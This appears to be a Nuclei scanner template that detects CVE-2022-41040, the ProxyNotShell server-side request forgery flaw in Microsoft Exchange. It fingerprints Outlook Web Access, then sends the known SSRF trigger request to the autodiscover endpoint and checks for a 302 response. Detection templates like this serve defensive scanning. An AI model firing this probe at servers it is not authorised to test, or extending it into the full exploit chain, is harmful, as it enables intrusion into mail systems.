id: CVE-2022-41040

info:
  name: Microsoft Exchange Server Server-Side Request Forgery Vulnerability
  author: Phillipo
  severity: high
  description: Microsoft Exchange Server Elevation of Privilege Vulnerability.
  reference:
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-41040
    - http://packetstormsecurity.com/files/170066/Microsoft-Exchange-ProxyNotShell-Remote-Code-Execution.html
    - https://hackerone.com/reports/1719719
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-918
    cve-id: CVE-2022-41040
  tags: cve,cve2022,kev,microsoft

flow: http(1) && http(2)

http:

  - method: GET
    path:
      - "{{BaseURL}}/owa/auth/logon.aspx"

    matchers-condition: or
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)(X-Owa-Version:)"

      - type: regex
        part: body
        regex:
          - "/owa/auth/[0-9.]+/"

      - type: word
        words:
          - '<title>Exchange Log In</title>'
          - '<title>Microsoft Exchange - Outlook Web Access</title>'

    extractors:
      - type: kval
        kval:
          - x_owa_version

      - type: regex
        part: body
        group: 1
        regex:
          - "/owa/auth/([0-9.]+)/"

  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"

    matchers:
      - type: status
        status:
          - 302
      - type: word
        negative: true
        words: 
          - "Protocol"
